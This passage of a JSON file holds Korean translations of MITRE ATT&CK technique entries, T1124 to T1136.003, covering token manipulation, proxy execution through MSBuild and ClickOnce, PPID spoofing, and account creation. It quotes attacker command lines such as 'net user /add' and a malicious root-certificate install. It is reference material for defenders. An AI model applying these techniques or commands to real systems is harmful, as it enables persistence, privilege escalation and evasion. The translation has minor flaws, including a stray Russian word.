기법)(인용: ESET DazzleSpy 2022년 1월)\n\n이 정보는 [예약된 작업/작업](https://attack.mitre.org/techniques/T1053)(인용: RSA EU12 그들은 내부에 있다)를 실행하거나 시간대에 따른 지역 정보를 발견하여 피해자 대상으로 하는 데 유용할 수 있습니다 (즉, [시스템 위치 발견](https://attack.mitre.org/techniques/T1614)). 적대자는 또한 시스템 시간을 알고 이를 타임 봄(시간폭탄)의 일환으로 사용하거나 지정된 날짜/시간까지 실행을 지연시킬 수 있습니다.(인용: AnyRun 타임폭탄)",
      "external_id": "T1124",
      "modified": "2024-04-16T12:50:15.929Z",
      "title": "System Time Discovery",
      "translated": true
    },
    {
      "description": "적대자는 컴퓨터의 주변 기기(예: 통합 카메라 또는 웹캠)나 애플리케이션(예: 화상 통화 서비스)을 활용하여 정보를 수집하기 위해 비디오 녹화를 실행할 수 있습니다. 특정 간격으로 장치나 애플리케이션에서 이미지를 캡처할 수도 있으며, 이는 비디오 파일 대신 사용될 수 있습니다.\n\n악성코드나 스크립트는 운영 체제나 애플리케이션에서 제공하는 API를 통해 장치와 상호작용하여 비디오나 이미지를 캡처할 수 있습니다. 비디오나 이미지 파일은 디스크에 저장되고 나중에 유출될 수 있습니다. 이 기술은 피해자의 화면을 캡처하는 것이 아니라 비디오 녹화를 위해 특정 장치나 애플리케이션을 사용하는 점에서 [스크린 캡처](https://attack.mitre.org/techniques/T1113)와 차이가 있습니다.\n\nmacOS에서는 FruitFly와 Proton과 같은 사용자의 웹캠을 기록하는 여러 가지 악성코드 샘플이 존재합니다. (출처: objective-see 2017 리뷰)",
      "external_id": "T1125",
      "modified": "2023-03-30T21:01:37.205Z",
      "title": "Video Capture",
      "translated": true
    },
    {
      "description": "적대적인 요소는 자신의 작업 흔적을 제거하기 위해 더 이상 필요하지 않은 공유 연결을 삭제할 수 있습니다. Windows 공유 드라이브 및 [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) 연결은 더 이상 필요하지 않을 때 제거될 수 있습니다. [Net](https://attack.mitre.org/software/S0039) 유틸리티는 <code>net use \\\\system\\share /delete</code> 명령어를 사용하여 네트워크 공유 연결을 제거하는 데 활용될 수 있는 예시입니다. (출처: Technet Net Use)",
      "external_id": "T1126",
      "modified": "2020-01-31T12:39:48.118Z",
      "title": "Network Share Connection Removal",
      "translated": true
    },
    {
      "description": "공격자는 신뢰할 수 있는 개발자 유틸리티를 이용하여 악성 페이로드의 실행을 프록시할 수 있습니다. 소프트웨어 개발과 관련된 작업에 사용되는 많은 유틸리티는 개발, 디버깅 및 리버스 엔지니어링을 지원하기 위해 다양한 형태로 코드를 실행하는 데 사용될 수 있습니다. (인용: engima0x3 DNX 우회)(인용: engima0x3 RCSI 우회)(인용: Exploit Monday WinDbg)(인용: LOLBAS 추적기) 이러한 유틸리티는 종종 합법적인 인증서로 서명되어 있어 시스템에서 실행될 수 있으며, 신뢰할 수 있는 프로세스를 통해 악성 코드의 실행을 프록시하여 애플리케이션 제어 솔루션을 효과적으로 우회하게 됩니다.",
      "external_id": "T1127",
      "modified": "2022-05-05T05:00:37.443Z",
      "title": "Trusted Developer Utilities Proxy Execution",
      "translated": true
    },
    {
      "description": "위협 행위자는 MSBuild를 사용하여 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시할 수 있습니다. MSBuild.exe(마이크로소프트 빌드 엔진)는 비주얼 스튜디오에서 사용하는 소프트웨어 빌드 플랫폼으로, 다양한 플랫폼 및 구성의 로딩 및 빌드를 위한 요구 사항을 정의하는 XML 형식의 프로젝트 파일을 처리합니다. (출처: MSDN MSBuild)\n\n위협 행위자는 MSBuild를 악성 코드 실행의 프록시로 악용할 수 있습니다. .NET 버전 4에서 도입된 MSBuild의 인라인 작업 기능은 XML 프로젝트 파일에 C# 또는 비주얼 베이직 코드를 삽입할 수 있도록 합니다. (출처: MSDN MSBuild) (출처: Microsoft MSBuild Inline Tasks 2017) MSBuild는 인라인 작업을 컴파일하고 실행합니다. MSBuild.exe는 서명된 마이크로소프트 바이너리로, 이와 같은 방식으로 사용될 경우 임의의 코드를 실행하고 MSBuild.exe 실행을 허용하도록 구성된 애플리케이션 제어 방어를 우회할 수 있습니다. (출처: LOLBAS Msbuild)",
      "external_id": "T1127.001",
      "modified": "2023-08-14T19:23:58.317Z",
      "title": "MSBuild",
      "translated": true
    },
    {
      "description": "공격자는 ClickOnce 애플리케이션(.appref-ms 및 .application 파일)을 사용하여 신뢰할 수 있는 Windows 유틸리티를 통한 코드 실행을 프록시할 수 있습니다.(출처: Burke/CISA ClickOnce BlackHat) ClickOnce는 사용자가 최소한의 사용자 상호작용으로 파일 공유 또는 웹 페이지에서 설치 및 실행되는 자기 업데이트 Windows 기반 .NET 애플리케이션(예: .XBAP, .EXE 또는 .DLL)을 생성할 수 있도록 하는 배포 방식입니다. 애플리케이션은 DFSVC.EXE의 자식 프로세스로 실행되며, 이 프로세스는 애플리케이션의 설치, 실행 및 업데이트를 담당합니다.(출처: SpectorOps Medium ClickOnce)\n\nClickOnce 애플리케이션은 제한된 권한만 부여받기 때문에 설치를 위해 관리자 권한이 필요하지 않습니다.(출처: Microsoft Learn ClickOnce) 따라서 공격자는 ClickOnce를 악성 코드 실행을 프록시하는 데 악용할 수 있으며, 권한 승급이 필요하지 않습니다.\n\nClickOnce는 여러 가지 방법으로 악용될 수 있습니다. 예를 들어, 공격자는 [사용자 실행](https://attack.mitre.org/techniques/T1204)에 의존할 수 있습니다. 사용자가 악의적인 웹사이트를 방문할 때, .NET 악성코드는 합법적인 소프트웨어로 위장하고 ClickOnce 설치를 위한 팝업이 표시됩니다.(출처: NetSPI ClickOnce)\n\n공격자는 또한 `rundll32.exe dfshim.dll,ShOpenVerbApplication1` 명령을 사용하여 [Rundll32](https://attack.mitre.org/techniques/T1218/011) 스크립트를 통해 악성 코드를 실행하기 위해 ClickOnce를 악용할 수 있습니다.(출처: LOLBAS /Dfsvc.exe)\n\n추가적으로, 공격자는 ClickOnce 애플리케이션 파일을 원격 사용자의 시작 폴더로 이동시키고 지속적인 악성 코드 배포를 할 수 있습니다(즉, [레지스트리 실행 키 / 시작 폴더](https://attack.mitre.org/techniques/T1547/001)).(출처: Burke/CISA ClickOnce BlackHat)(출처: Burke/CISA ClickOnce Paper)",
      "external_id": "T1127.002",
      "modified": "2024-10-17T18:50:41.474Z",
      "title": "ClickOnce",
      "translated": true
    },
    {
      "description": "Netsh.exe(네트쉘이라고도 불림)는 시스템의 네트워크 구성을 조작하는 데 사용되는 명령줄 스크립팅 유틸리티입니다. 이 유틸리티의 기능을 확장하기 위해 보조 DLL을 추가하는 기능을 포함하고 있습니다. (출처: TechNet Netsh) 등록된 netsh.exe 보조 DLL의 경로는 Windows 레지스트리의 <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>에 입력됩니다.\n\n공격자는 netsh.exe와 보조 DLL을 사용하여 임의 코드의 실행을 지속 가능하게 프록시하는 방식으로 사용할 수 있으며, 이는 netsh.exe가 다른 지속성 기술과 함께 자동으로 실행되거나 시스템에 있는 다른 지속 소프트웨어가 정상적인 기능의 일환으로 netsh.exe를 실행할 때 발생합니다. 예를 들어, 일부 VPN 소프트웨어가 netsh.exe를 호출하는 경우가 있습니다. (출처: Demaske Netsh Persistence)\n\nCobalt Strike의 페이로드를 netsh.exe 보조 DLL을 사용하여 로드하는 개념 증명 코드가 존재합니다. (출처: Github Netsh Helper CS Beacon)",
      "external_id": "T1128",
      "modified": "2020-01-24T14:27:28.869Z",
      "title": "Netsh Helper DLL",
      "translated": true
    },
    {
      "description": "위협 행위자는 공유 모듈을 로드하여 악성 페이로드를 실행할 수 있습니다. 공유 모듈은 재사용 가능한 코드에 접근하기 위해 프로세스에 로드되는 실행 파일로, 특정 맞춤 함수나 운영 체제 API 함수를 호출하는 데 사용됩니다 (예: [네이티브 API](https://attack.mitre.org/techniques/T1106)).\n\n위협 행위자는 이 기능을 활용하여 피해 시스템에서 임의의 페이로드를 실행할 수 있습니다. 예를 들어, 위협 행위자는 그들의 악성코드 기능을 여러 가지 기능(예: C2 네트워크 통신 관리 또는 특정 작업 실행)으로 나눈 공유 객체로 모듈화할 수 있습니다.\n\nLinux 및 macOS 모듈 로더는 임의의 로컬 경로에서 공유 객체를 로드하고 실행할 수 있습니다. 이 기능은 `dlfcn.h`에 있으며 `dlopen`과 `dlsym`과 같은 함수에서 사용됩니다. macOS는 `.so` 파일을 실행할 수 있지만, 일반적인 관행은 `.dylib` 파일을 사용하는 것입니다.(출처: Apple Dev Dynamic Libraries)(출처: Linux Shared Libraries)(출처: RotaJakiro 2021 netlab360 분석)(출처: Unit42 OceanLotus 2017)\n\nWindows 모듈 로더는 임의의 로컬 경로와 임의의 유니버설 네이밍 컨벤션(UNC) 네트워크 경로에서 DLL을 로드하도록 지시할 수 있습니다. 이 기능은 `NTDLL.dll`에 존재하며, `LoadLibrary`와 같은 함수에서 런타임에 호출되는 Windows [네이티브 API](https://attack.mitre.org/techniques/T1106)의 일부입니다.(출처: Microsoft DLL)",
      "external_id": "T1129",
      "modified": "2023-10-12T21:17:14.868Z",
      "title": "Shared Modules",
      "translated": true
    },
    {
      "description": "루트 인증서는 공개 키 암호화에서 루트 인증 기관(CA)을 식별하는 데 사용됩니다. 루트 인증서가 설치되면 시스템이나 응용 프로그램은 루트 인증서에 의해 서명된 루트의 신뢰 체인에 있는 인증서를 신뢰하게 됩니다. (출처: 위키백과 루트 인증서) 인증서는 웹 브라우저 내에서 안전한 TLS/SSL 통신을 설정하는 데 일반적으로 사용됩니다. 사용자가 신뢰할 수 없는 인증서를 제시하는 웹사이트를 탐색하려고 할 경우, 보안 위험을 경고하는 오류 메시지가 표시됩니다. 보안 설정에 따라 브라우저는 사용자가 웹사이트에 연결하는 것을 허용하지 않을 수도 있습니다.\n\n손상된 시스템에 루트 인증서를 설치하면 공격자는 해당 시스템의 보안을 저하시킬 수 있는 방법을 얻게 됩니다. 공격자는 이 기술을 사용하여 HTTPS를 통해 악의적으로 제어되는 웹 서버에 연결할 때 사용자가 보안 경고를 피하도록 하였으며, 이는 정당한 웹사이트를 가장하여 로그인 자격 증명을 수집하는 데 사용되었습니다. (출처: 작전 엠멘탈)\n\n비정상적인 루트 인증서도 제조업체나 소프트웨어 공급망에 의해 시스템에 미리 설치되었으며, 맬웨어/애드웨어와 함께 사용되어 TLS/SSL 통신에서 전송되는 정보를 가로채기 위한 중간자 공격 기능을 제공했습니다. (출처: 카스퍼스키 슈퍼피쉬)\n\n루트 인증서(및 관련 체인)는 클론할 수 있고 재설치할 수 있습니다. 클론된 인증서 체인은 소스와 많은 동일한 메타데이터 특성을 보유하며, 이는 악의적인 코드를 서명하는 데 사용될 수 있어 서명 검증 도구(예: Sysinternals, 안티바이러스 등)를 우회하여 실행을 차단하거나 지속성의 흔적을 발견하는 데 도움을 줄 수 있습니다. (출처: 스펙터옵스 코드 서명 2017년 12월)\n\nmacOS에서 Ay MaMi 맬웨어는 <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> 명령어를 사용하여 악의적인 인증서를 시스템 키체인에 신뢰할 수 있는 루트 인증서로 설치합니다. (출처: objective-see ay mami 2018)",
      "external_id": "T1130",
      "modified": "2020-02-21T21:11:06.761Z",
      "title": "Install Root Certificate",
      "translated": true
    },
    {
      "description": "Windows 인증 패키지 DLL은 시스템 시작 시 로컬 보안 권한(LSA) 프로세스에 의해 로드됩니다. 이들은 여러 로그온 프로세스 및 여러 보안 프로토콜을 운영 체제에 지원합니다. (출처: MSDN 인증 패키지)\n\n위협 행위자는 LSA 인증 패키지에서 제공하는 자동 시작 메커니즘을 활용하여 지속성을 유지할 수 있습니다. 이는 Windows 레지스트리 위치 <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code>에 바이너리에 대한 참조를 <code>\"Authentication Packages\"=<target binary></code> ключ 값으로 추가함으로써 이루어집니다. 그러면 인증 패키지가 로드될 때 시스템에 의해 해당 바이너리가 실행됩니다.",
      "external_id": "T1131",
      "modified": "2020-01-24T15:43:25.280Z",
      "title": "Authentication Package",
      "translated": true
    },
    {
      "description": "적대자는 명령 및 제어(C2) 트래픽의 내용을 감지하기 어렵게 만들기 위해 데이터를 인코딩할 수 있습니다. 명령 및 제어 정보는 표준 데이터 인코딩 시스템을 사용하여 인코딩될 수 있습니다. 데이터 인코딩의 사용은 기존 프로토콜 사양을 준수할 수 있으며 ASCII, 유니코드, Base64, MIME 또는 기타 이진-텍스트 및 문자 인코딩 시스템의 사용을 포함합니다. (출처: Wikipedia Binary-to-text Encoding) (출처: Wikipedia Character Encoding) 일부 데이터 인코딩 시스템은 gzip과 같은 데이터 압축도 생성할 수 있습니다.",
      "external_id": "T1132",
      "modified": "2023-04-21T12:20:20.711Z",
      "title": "Data Encoding",
      "translated": true
    },
    {
      "description": "공격자는 명령 및 제어 트래픽의 내용을 탐지하기 어렵게 만들기 위해 표준 데이터 인코딩 시스템을 사용하여 데이터를 인코딩할 수 있습니다. 명령 및 제어(C2) 정보는 기존 프로토콜 사양에 따라 인코딩되는 표준 데이터 인코딩 시스템을 사용하여 인코딩될 수 있습니다. 일반적인 데이터 인코딩 방식에는 ASCII, Unicode, 16진수, Base64 및 MIME이 포함됩니다. (출처: 위키백과 이진-문자 인코딩) (출처: 위키백과 문자 인코딩) 일부 데이터 인코딩 시스템은 gzip과 같은 데이터 압축을 초래할 수도 있습니다.",
      "external_id": "T1132.001",
      "modified": "2023-03-03T00:31:33.071Z",
      "title": "Standard Encoding",
      "translated": true
    },
    {
      "description": "적대자는 명령 및 제어 트래픽의 내용을 감지하기 더 어렵게 만들기 위해 비표준 데이터 인코딩 시스템을 사용하여 데이터를 인코딩할 수 있습니다. 명령 및 제어(C2) 정보는 기존 프로토콜 사양과 분리된 비표준 데이터 인코딩 시스템을 사용하여 인코딩될 수 있습니다. 비표준 데이터 인코딩 스킴은 HTTP 요청의 메시지 본문에 대해 수정된 Base64 인코딩과 같은 표준 데이터 인코딩 스킴을 기반으로 하거나 관련될 수 있습니다. (출처: 위키백과 이진-텍스트 인코딩) (출처: 위키백과 문자 인코딩)",
      "external_id": "T1132.002",
      "modified": "2020-03-14T23:39:50.117Z",
      "title": "Non-Standard Encoding",
      "translated": true
    },
    {
      "description": "적대자는 네트워크에 처음 접근하거나 지속적으로 남아 있기 위해 외부-facing 원격 서비스를 활용할 수 있습니다. VPN, Citrix 및 기타 접속 메커니즘과 같은 원격 서비스는 사용자가 외부 위치에서 내부 기업 네트워크 자원에 연결할 수 있게 해줍니다. 이러한 서비스에 대한 연결 및 자격 증명 인증을 관리하는 원격 서비스 게이트웨이가 있는 경우가 많습니다. [Windows 원격 관리](https://attack.mitre.org/techniques/T1021/006) 및 [VNC](https://attack.mitre.org/techniques/T1021/005)와 같은 서비스도 외부에서 사용될 수 있습니다. (출처: MacOS VNC 소프트웨어를 통한 원격 데스크탑)\n\n서비스를 사용하기 위해 [유효한 계정](https://attack.mitre.org/techniques/T1078)에 대한 접근이 종종 필요하며, 이는 자격 증명 파밍과 같은 방법으로 얻거나, 기업 네트워크를 침해한 후 사용자로부터 자격 증명을 획득하여 얻을 수 있습니다. (출처: Volexity 가상 사설 키로깅) 원격 서비스에 대한 접근은 작동 중에 중복적이거나 지속적인 접근 메커니즘으로 사용될 수 있습니다.\n\n또한 인증이 필요하지 않은 노출된 서비스를 통해 접근할 수도 있습니다. 컨테이너화된 환경에서는 노출된 Docker API, Kubernetes API 서버, kubelet 또는 Kubernetes 대시보드와 같은 웹 애플리케이션이 포함될 수 있습니다. (출처: Trend Micro 노출된 Docker 서버) (출처: Unit 42 힐데가르드 악성코드)",
      "external_id": "T1133",
      "modified": "2023-03-30T21:01:36.318Z",
      "title": "External Remote Services",
      "translated": true
    },
    {
      "description": "공격자는 액세스 토큰을 수정하여 다른 사용자 또는 시스템 보안 컨텍스트에서 작동하며 작업을 수행하고 접근 제어를 우회할 수 있습니다. Windows는 실행 중인 프로세스의 소유권을 결정하기 위해 액세스 토큰을 사용합니다. 사용자는 액세스 토큰을 조작하여 실행 중인 프로세스가 다른 프로세스의 자식인 것처럼 보이거나 프로세스를 시작한 사용자 외의 다른 사용자에 속하는 것처럼 만들 수 있습니다. 이러한 경우, 프로세스는 새 토큰과 관련된 보안 컨텍스트를 취하게 됩니다.\n\n공격자는 기존 프로세스에서 액세스 토큰을 복사하기 위해 내장 Windows API 함수를 사용할 수 있습니다. 이를 토큰 훔치기(token stealing)라고 합니다. 이러한 토큰은 기존 프로세스에 적용되거나(예: [토큰 위장/절도](https://attack.mitre.org/techniques/T1134/001)), 새 프로세스를 생성하는 데 사용될 수 있습니다(예: [토큰으로 프로세스 생성](https://attack.mitre.org/techniques/T1134/002)). 공격자는 토큰을 훔치기 위해 이미 권한 있는 사용자 컨텍스트(예: 관리자) 상태여야 합니다. 그러나 공격자들은 일반적으로 토큰 훔치기를 사용하여 보안 컨텍스트를 관리자 수준에서 SYSTEM 수준으로 상승시킵니다. 그런 다음 공격자는 그 토큰의 계정이 원격 시스템에서 적절한 권한을 가지고 있을 경우 그 계정으로 원격 시스템에 인증하는 데 사용할 수 있습니다. (인용: Pentestlab 토큰 조작)\n\n모든 일반 사용자는 <code>runas</code> 명령 및 Windows API 기능을 사용하여 위장 토큰을 생성할 수 있으며, 관리자 계정에 대한 접근 권한이 필요하지 않습니다. 또한 액세스 토큰을 수정하는 데 사용할 수 있는 Active Directory 필드와 같은 다른 메커니즘도 있습니다.",
      "external_id": "T1134",
      "modified": "2023-03-30T21:01:47.762Z",
      "title": "Access Token Manipulation",
      "translated": true
    },
    {
      "description": "해커는 다른 사용자의 기존 토큰을 복제하여 그 사용자를 가장함으로써 권한을 상승시키고 접근 제어를 우회할 수 있습니다. 예를 들어, 해커는 `DuplicateToken` 또는 `DuplicateTokenEx`를 사용하여 기존 토큰을 복제할 수 있습니다. (출처: DuplicateToken 함수) 그런 다음 이 토큰은 `ImpersonateLoggedOnUser`와 함께 사용되어 호출 스레드가 로그인한 사용자의 보안 컨텍스트를 가장하게 하거나, `SetThreadToken`을 사용하여 가장한 토큰을 스레드에 할당할 수 있습니다.\n\n해커는 특정 기존 프로세스에 복제된 토큰을 할당하고자 할 때 [토큰 가장하기/탈취](https://attack.mitre.org/techniques/T1134/001)를 수행할 수 있습니다. 예를 들어, 이것은 대상 사용자가 시스템에서 네트워크에 로그인하지 않은 세션을 가질 때 유용할 수 있습니다.\n\n해커가 복제된 토큰을 사용하여 기존 프로세스에 연결하는 것보다 새로운 프로세스를 생성하고자 할 경우, `CreateProcessWithTokenW` 또는 `CreateProcessAsUserW`를 사용하여 추가로 [토큰으로 프로세스 생성](https://attack.mitre.org/techniques/T1134/002)을 수행할 수 있습니다. [토큰 가장하기/탈취](https://attack.mitre.org/techniques/T1134/001)는 새로운 토큰을 생성하는 것이 아니라 기존 토큰을 복제하는 것을 의미한다는 점에서 [토큰 생성 및 가장하기](https://attack.mitre.org/techniques/T1134/003)와도 구별됩니다.",
      "external_id": "T1134.001",
      "modified": "2024-01-10T17:57:36.177Z",
      "title": "Token Impersonation/Theft",
      "translated": true
    },
    {
      "description": "공격자는 기존 토큰을 사용하여 새로운 프로세스를 생성함으로써 권한을 상승시키고 접근 제어를 우회할 수 있습니다. `<code>CreateProcessWithTokenW</code>` 및 `<code>runas</code>`와 같은 기능을 사용하여 다른 사용자의 토큰과 결과적인 보안 컨텍스트로 프로세스를 생성할 수 있습니다. (출처: Microsoft RunAs)\n\n현재 사용자와 관련되지 않은 토큰으로 프로세스를 생성하려면 대상 사용자의 자격 증명, 해당 사용자를 가장할 수 있는 특정 권한, 또는 사용될 토큰에 대한 접근이 필요할 수 있습니다. 예를 들어, 토큰은 [토큰 위장/도난](https://attack.mitre.org/techniques/T1134/001)을 통해 복제되거나 [토큰 생성 및 위장](https://attack.mitre.org/techniques/T1134/003)을 통해 생성된 후 프로세스를 생성하는 데 사용될 수 있습니다.\n\n이 기술은 [토큰 위장/도난](https://attack.mitre.org/techniques/T1134/001)과는 구별되지만, 토큰이 복제된 후 새로운 프로세스를 생성하는 데 사용할 수 있어 두 기술을 함께 활용할 수 있습니다.",
      "external_id": "T1134.002",
      "modified": "2023-04-11T21:14:37.714Z",
      "title": "Create Process with Token",
      "translated": true
    },
    {
      "description": "적대자는 새로운 토큰을 생성하고 사용자를 가장하여 권한을 상승시키고 접근 제어를 우회할 수 있습니다. 예를 들어, 적대자가 사용자 이름과 비밀번호를 가지고 있지만 사용자가 시스템에 로그인하지 않은 경우, 적대자는 `LogonUser` 함수를 사용하여 해당 사용자의 로그인 세션을 생성할 수 있습니다. (인용: LogonUserW 함수) 이 함수는 새로운 세션의 접근 토큰 사본을 반환하며, 적대자는 `SetThreadToken`을 사용하여 해당 토큰을 스레드에 할당할 수 있습니다.\n\n이 행동은 기존의 토큰을 가로채거나 복제하는 것과는 다르게, 새로운 사용자 토큰을 생성하는 것을 의미한다는 점에서 [토큰 가장하기/도용](https://attack.mitre.org/techniques/T1134/001)과 구별됩니다.",
      "external_id": "T1134.003",
      "modified": "2024-01-10T17:55:46.905Z",
      "title": "Make and Impersonate Token",
      "translated": true
    },
    {
      "description": "적대 세력은 새로운 프로세스의 부모 프로세스 식별자(PPID)를 스푸핑하여 프로세스 모니터링 방어를 회피하거나 권한을 상승시킬 수 있습니다. 새로운 프로세스는 일반적으로 부모 프로세스에서 직접 생성되거나 호출 프로세스에서 생성되며, 명시적으로 지정되지 않는 한 이런 방식으로 동작합니다. 새로운 프로세스의 PPID를 명시적으로 할당하는 한 가지 방법은 <code>CreateProcess</code> API 호출을 사용하는 것이며, 여기서는 사용할 PPID를 정의하는 매개변수를 지원합니다. (인용: DidierStevens SelectMyParent Nov 2009) 이 기능은 요청된 고급 프로세스가 SYSTEM에 의해 생성될 때 (일반적으로 <code>svchost.exe</code> 또는 <code>consent.exe</code>를 통해) PPID를 올바르게 설정하기 위해 사용자 계정 컨트롤(UAC)과 같은 Windows 기능에서 사용됩니다. (인용: Microsoft UAC Nov 2018)\n\n적대 세력은 이러한 메커니즘을 악용하여 Office 문서에서 직접 생성되는 프로세스를 차단하는 방어를 회피하거나, 비정상적이거나 잠재적으로 악의적인 부모-자식 프로세스 관계를 분석하는 방어를 피할 수 있습니다. 예를 들어, [PowerShell](https://attack.mitre.org/techniques/T1059/001) 또는 [Rundll32](https://attack.mitre.org/techniques/T1218/011)의 PPID를 스푸핑하여 <code>explorer.exe</code>로 설정하고, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)로 전달된 Office 문서가 아닌 방향으로 설정할 수 있습니다. (인용: CounterCept PPID Spoofing Dec 2018) 이러한 스푸핑은 악성 Office 문서 내에서 [Visual Basic](https://attack.mitre.org/techniques/T1059/005) 또는 [Native API](https://attack.mitre.org/techniques/T1106)를 수행할 수 있는 코드로 실행될 수 있습니다. (인용: CTD PPID Spoofing Macro Mar 2019)(인용: CounterCept PPID Spoofing Dec 2018)\n\nPPID를 명시적으로 할당하면, 적절한 접근 권한이 주어진 경우 권한이 상승될 수 있습니다. 예를 들어, 권한이 있는 사용자 컨텍스트 (즉, 관리자)의 적대 세력이 새 프로세스를 생성하고 부모 프로세스를 SYSTEM으로 실행되는 프로세스(예: <code>lsass.exe</code>)로 지정할 경우, 새 프로세스는 상속된 접근 토큰을 통해 권한이 상승됩니다. (인용: XPNSec PPID Nov 2017)",
      "external_id": "T1134.004",
      "modified": "2022-05-03T02:15:42.360Z",
      "title": "Parent PID Spoofing",
      "translated": true
    },
    {
      "description": "위협 행위자는 SID-History 주입을 사용하여 권한을 상승시키고 접근 제어를 우회할 수 있습니다. Windows 보안 식별자(SID)는 사용자 또는 그룹 계정을 식별하는 고유한 값입니다. SID는 Windows 보안에서 보안 설명자와 접근 토큰 모두에 사용됩니다. (인용: Microsoft SID) 계정은 SID-History Active Directory 속성에 추가 SID를 보유할 수 있어 (인용: Microsoft SID-History Attribute) 도메인 간의 상호 운용 가능한 계정 마이그레이션을 가능하게 합니다(예: SID-History의 모든 값은 접근 토큰에 포함됩니다).\n\n도메인 관리자가 (또는 이에 상응하는 권한) 있는 경우, 수집된 또는 잘 알려진 SID 값(인용: Microsoft Well Known SIDs Jun 2017)을 SID-History에 삽입하여 임의의 사용자/그룹(예: 엔터프라이즈 관리자)의 가장을 가능하게 할 수 있습니다. 이러한 조작은 로컬 자원에 대한 접근 권한 상승 또는 [원격 서비스](https://attack.mitre.org/techniques/T1021), [SMB/Windows 관리 공유](https://attack.mitre.org/techniques/T1021/002), 또는 [Windows 원격 관리](https://attack.mitre.org/techniques/T1021/006)와 같은 측면 이동 기술을 통해 접근하기 어려운 도메인에 대한 접근을 초래할 수 있습니다.",
      "external_id": "T1134.005",
      "modified": "2021-02-09T15:49:58.414Z",
      "title": "SID-History Injection",
      "translated": true
    },
    {
      "description": "적대자는 수집을 위한 전초 작업으로 정보를 수집할 출처를 식별하기 위해 원격 시스템에서 공유된 폴더와 드라이브를 찾으려고 할 수 있습니다. 이는 측면 이동(Lateral Movement)을 위한 잠재적 시스템 식별과도 관련이 있습니다. 네트워크에는 다양한 시스템에서 파일 디렉토리에 접근할 수 있도록 하는 공유 네트워크 드라이브와 폴더가 종종 포함되어 있습니다.\n\nWindows 네트워크에서의 파일 공유는 SMB 프로토콜을 통해 이루어집니다. (출처: 위키피디아 공유 리소스) (출처: TechNet 공유 폴더) [Net](https://attack.mitre.org/software/S0039) 명령을 사용하여 원격 시스템에서 사용 가능한 공유 드라이브를 쿼리할 수 있습니다: <code>net view \\\\\\\\remotesystem</code>. 또한, 로컬 시스템에서 공유 드라이브를 쿼리할 수 있는 <code>net share</code> 명령도 제공됩니다. macOS의 경우, <code>sharing -l</code> 명령을 사용하여 smb 서비스에 사용되는 모든 공유 지점을 나열할 수 있습니다.",
      "external_id": "T1135",
      "modified": "2023-09-29T19:44:43.870Z",
      "title": "Network Share Discovery",
      "translated": true
    },
    {
      "description": "적대 세력은 피해 시스템에 대한 접근을 유지하기 위해 계정을 생성할 수 있습니다. (인용: Symantec WastedLocker 2020년 6월) 충분한 수준의 접근 권한이 있을 경우, 이러한 계정을 생성하여 시스템에 지속적인 원격 접근 도구를 배포할 필요가 없는 2차 자격 증명 접근을 마련할 수 있습니다.\n\n계정은 로컬 시스템이나 도메인 또는 클라우드 테넌트 내에 생성될 수 있습니다. 클라우드 환경에서는 적대 세력이 특정 서비스에만 접근할 수 있는 계정을 생성할 수 있으며, 이는 탐지될 가능성을 줄일 수 있습니다.",
      "external_id": "T1136",
      "modified": "2024-10-15T15:53:21.895Z",
      "title": "Create Account",
      "translated": true
    },
    {
      "description": "위협은 피해 시스템에 대한 접근을 유지하기 위해 로컬 계정을 생성할 수 있습니다. 로컬 계정은 조직에서 사용자, 원격 지원, 서비스 또는 단일 시스템 또는 서비스의 관리를 위해 설정한 계정입니다.\n\n예를 들어, 충분한 접근 권한이 있을 경우 Windows에서 <code>net user /add</code> 명령을 사용하여 로컬 계정을 생성할 수 있습니다. macOS 시스템에서는 <code>dscl -create</code> 명령을 사용하여 로컬 계정을 생성할 수 있습니다. 로컬 계정은 네트워크 장치에도 추가될 수 있으며, 일반적인 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008) 명령인 <code>username</code> 또는 `kubectl` 유틸리티를 사용하여 Kubernetes 클러스터에 추가될 수 있습니다.(인용: cisco_username_cmd)(인용: Kubernetes 서비스 계정 보안)\n\n이러한 계정은 시스템에 영구적인 원격 접근 도구를 배포할 필요 없이 2차 자격 증명된 접근을 설정하는 데 사용할 수 있습니다.",
      "external_id": "T1136.001",
      "modified": "2023-10-16T17:40:37.995Z",
      "title": "Local Account",
      "translated": true
    },
    {
      "description": "적대 세력은 희생 시스템에 대한 접근을 유지하기 위해 도메인 계정을 생성할 수 있습니다. 도메인 계정은 Active Directory 도메인 서비스에 의해 관리되며, 해당 도메인의 시스템 및 서비스 전체에 대해 접근 및 권한이 구성됩니다. 도메인 계정은 사용자, 관리자 및 서비스 계정을 포함할 수 있습니다. 충분한 수준의 접근 권한이 있을 경우, <code>net user /add /domain</code> 명령어를 사용하여 도메인 계정을 생성할 수 있습니다. (출처: Savill 1999)\n\n이러한 계정은 시스템에 지속적인 원격 접근 도구를 배포할 필요 없이 2차 자격 증명 접근을 설정하는 데 사용될 수 있습니다.",
      "external_id": "T1136.002",
      "modified": "2024-02-01T04:37:36.774Z",
      "title": "Domain Account",
      "translated": true
    },
    {
      "description": "위험요소는 피해 시스템에 대한 접근을 유지하기 위해 클라우드 계정을 생성할 수 있습니다. 충분한 수준의 접근 권한을 가진 경우, 이러한 계정은 시스템에 지속적인 원격 접근 도구를 배치하지 않고도 추가적인 인증된 접근을 설정하는 데 사용될 수 있습니다.(인용: Microsoft O365 관리 역할)(인용: Microsoft 지원 O365 다른 관리자를 추가하기, 2019년 10월)(인용: AWS IAM 사용자 생성)(인용: GCP 클라우드 아이덴티티 사용자 생성)(인용: Microsoft Azure AD 사용자)\n\n사용자 계정 외에도 클라우드 계정은 서비스와 연결될 수 있습니다. 클라우드 제공업체는 서비스 계정의 개념을 다르게 처리합니다. Azure에서는 서비스 계정이 서비스 주체와 관리된 ID를 포함하며, 이러한 계정은 다양한 리소스(예: OAuth 애플리케이션, 서버리스 기능 및 가상 머신)에 연결되어 해당 리소스가 환경 내에서 다양한 작업을 수행할 수 있도록 권한을 부여합니다.(인용: Microsoft Entra ID 서비스 주체) GCP에서는 서비스 계정이 특정 리소스에 연결될 수 있으며, 다른 계정에 의해 [임시 클라우드 상승 접근](https://attack.mitre.org/techniques/T1548/005)으로 가장될 수 있습니다.(인용: GCP 서비스 계정) AWS는 